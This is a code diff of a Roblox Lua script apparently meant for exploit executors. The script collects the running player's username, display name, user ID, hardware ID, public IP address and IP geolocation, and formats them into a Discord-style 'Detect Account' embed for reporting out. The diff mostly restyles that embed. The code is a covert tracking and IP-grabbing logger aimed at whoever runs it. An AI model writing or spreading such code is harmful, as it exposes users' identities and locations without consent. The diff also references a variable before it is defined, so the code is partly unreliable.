@@ -10,9 +10,7 @@ local function checkAndKickPlayer()
 end    
 checkAndKickPlayer()
 local Players = game:GetService("Players")
-local Name = LocalPlayer.Name
-
--- Player Info
+local Name = game.Players.LocalPlayer.Name
 local LocalPlayer = Players.LocalPlayer
 local Userid = LocalPlayer.UserId
 local DName = LocalPlayer.DisplayName
@@ -24,11 +22,6 @@ local GetIp = game:HttpGet("https://v4.ident.me/")
 local GetData = game:HttpGet("http://ip-api.com/json")
 local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
 local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
-
--- Game Info
-local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
-
-local playerCount = #game:GetService("Players"):GetPlayers()
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 local ExecutorUsing = identifyexecutor()
 local HttpService = game:GetService("HttpService")
@@ -36,37 +29,32 @@ local Data =
 {
     ["embeds"] = {
         {
-            ["title"] = "Detect Account",
+            ["title"] = " 🧾 Detect Account",
             ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId,
-            ["description"] = "```"..game.Players.LocalPlayer.DisplayName.." ```",
+            ["description"] = "```"..game.Players.LocalPlayer.DisplayName.." ```\n```"..Name.."```",
             ["color"] = tonumber("0xf7c74b"),
             ["thumbnail"] = {["url"] = "https://cdn.discordapp.com/attachments/1277112182743629969/1277337544463224898/Picsart_24-08-26_01-42-34-420.png?ex=66ccccca&is=66cb7b4a&hm=80a0165401d2357f1386cfa88da35a3df2427c1186b0e8b7955272f6c5f6ead9&"},
             ["fields"] = {
-            	{
-                    ["name"] = "username:",
-                    ["value"] = Name,
-                    ["inline"] = true
-                },
                 {
-                    ["name"] = "Execute:",
+                    ["name"] = "💻 Executer:",
                     ["value"] = "```"..ExecutorUsing.."```",
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "Hwid:",
+                    ["name"] = "💳 Hwid:",
                     ["value"] = hwid,
                     ["inline"] = true
                 },
                 
                 {                
-                    ["name"] = "Time:",
+                    ["name"] = "⏳ Time:",
                     ["value"] = tostring(os.date("%X")),
                     ["inline"] = true
                 },
         
                 {                
                     ["name"] = "Job ID:",
-                    ["value"] = " " .. jobId,
+                    ["value"] = " " .. ConsoleJobId,
                     ["inline"] = true
                 },
                 
